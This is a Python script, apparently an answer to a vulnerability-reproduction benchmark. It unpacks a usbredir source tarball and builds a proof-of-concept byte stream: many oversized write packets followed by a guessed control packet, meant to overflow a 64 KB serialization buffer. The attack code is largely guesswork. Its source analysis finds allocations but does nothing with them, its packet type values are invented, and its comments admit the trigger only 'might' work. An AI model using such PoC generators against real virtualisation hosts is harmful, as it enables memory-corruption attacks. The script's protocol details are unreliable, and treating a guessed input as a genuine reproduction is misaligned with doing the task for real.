import os
import struct
import tempfile
import subprocess
import re
import math
from typing import Optional, List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source code to understand the protocol
        temp_dir = tempfile.mkdtemp()
        
        # Extract tarball
        import tarfile
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall(temp_dir)
        
        # Find the relevant source files
        source_dir = self._find_source_root(temp_dir)
        
        # Analyze to understand packet structure
        packet_info = self._analyze_source(source_dir)
        
        # Generate PoC based on vulnerability description
        poc = self._generate_poc(packet_info)
        
        # Clean up
        import shutil
        shutil.rmtree(temp_dir)
        
        return poc
    
    def _find_source_root(self, temp_dir: str) -> str:
        # Look for source files
        for root, dirs, files in os.walk(temp_dir):
            # Check for C source files
            c_files = [f for f in files if f.endswith(('.c', '.h'))]
            if len(c_files) > 10:  # Arbitrary threshold
                return root
        return temp_dir
    
    def _analyze_source(self, source_dir: str) -> dict:
        # Look for buffer size constants and serialization functions
        buffer_size = 65536  # Default USBREDIRPARSER_SERIALIZE_BUF_SIZE
        packet_structs = {}
        
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                if file.endswith(('.c', '.h')):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # Look for buffer size definition
                            patterns = [
                                r'USBREDIRPARSER_SERIALIZE_BUF_SIZE\s*=\s*(\d+)',
                                r'#define\s+USBREDIRPARSER_SERIALIZE_BUF_SIZE\s+(\d+)',
                                r'64\s*[kK][bB]',
                                r'65536'
                            ]
                            
                            for pattern in patterns:
                                match = re.search(pattern, content, re.IGNORECASE)
                                if match:
                                    if pattern == r'65536':
                                        buffer_size = 65536
                                    elif match.group(1):
                                        buffer_size = int(match.group(1))
                            
                            # Look for serialization function
                            if 'serialize_data' in content:
                                # Extract function signature to understand parameters
                                lines = content.split('\n')
                                for i, line in enumerate(lines):
                                    if 'serialize_data' in line and '(' in line:
                                        # Try to find the function body
                                        for j in range(i, min(i + 50, len(lines))):
                                            if '{' in lines[j]:
                                                # Look for buffer operations
                                                for k in range(j, min(j + 100, len(lines))):
                                                    if 'realloc' in lines[k] or 'malloc' in lines[k]:
                                                        # Found potential reallocation
                                                        pass
                                                    if '}' in lines[k]:
                                                        break
                                                break
                    except:
                        continue
        
        # Based on vulnerability description, we need to create enough buffered data
        # to cause reallocation during serialization. We'll create packets that
        # accumulate write buffers exceeding the 64KB limit.
        
        # For USB redirection protocol, we need to understand packet structure
        # From typical usbredir implementations, packets have:
        # - 4 byte type
        # - 4 byte length
        # - data
        
        return {
            'buffer_size': buffer_size,
            'packet_header_size': 8,
            'max_write_size': 65535,  # Typical max for usbredir
        }
    
    def _generate_poc(self, packet_info: dict) -> bytes:
        # Generate a sequence of write packets that will cause buffer overflow
        # during serialization
        
        buffer_size = packet_info['buffer_size']
        header_size = packet_info['packet_header_size']
        max_write = packet_info['max_write_size']
        
        # We need to create enough buffered data to exceed buffer_size
        # The vulnerability happens when serializing with large buffered write data
        
        # Strategy:
        # 1. Create many write packets that will be buffered
        # 2. Ensure total buffered data > buffer_size to cause reallocation
        # 3. Trigger serialization (may require specific packet)
        
        poc = b''
        
        # First, let's create a bulk of write data packets
        # We'll use packet type 0x00000001 for write (common in usbredir)
        write_packet_type = struct.pack('<I', 0x00000001)
        
        # Each write packet should have data that gets buffered
        # We'll create packets with increasing sizes to fill buffer gradually
        
        total_buffered = 0
        target_buffered = buffer_size * 2  # Exceed buffer to trigger reallocation
        
        # Create small packets first, then larger ones
        packet_sizes = []
        current_size = 1024  # Start with 1KB packets
        
        while total_buffered < target_buffered:
            # Adjust packet size to not exceed max
            packet_size = min(current_size, max_write)
            packet_sizes.append(packet_size)
            total_buffered += packet_size
            current_size = min(current_size * 2, max_write)
        
        # Generate the actual packet data
        for size in packet_sizes:
            # Packet header: type + length
            packet_length = header_size + size
            header = write_packet_type + struct.pack('<I', packet_length)
            
            # Packet data (can be any data, we'll use pattern)
            data = b'X' * size
            
            poc += header + data
        
        # Now we need to trigger serialization
        # This might be a specific control packet or migration command
        # Based on the description, serialization happens during QEMU migration
        # Let's add a control packet that might trigger serialization
        
        # Common control packet types in usbredir:
        # - 0x00000000: hello/start
        # - 0x00000002: control
        
        # Add a control packet that might trigger serialization
        control_type = struct.pack('<I', 0x00000002)  # Control packet
        control_length = struct.pack('<I', header_size + 16)  # Small control data
        control_data = b'\x00' * 16  # Some control data
        
        poc += control_type + control_length + control_data
        
        # Add more data to ensure we hit the exact vulnerability
        # The PoC needs to be large enough to trigger the specific code path
        
        # Add some additional packets to ensure proper triggering
        for _ in range(10):
            small_packet_size = 512
            small_header = write_packet_type + struct.pack('<I', header_size + small_packet_size)
            small_data = b'Y' * small_packet_size
            poc += small_header + small_data
        
        return poc
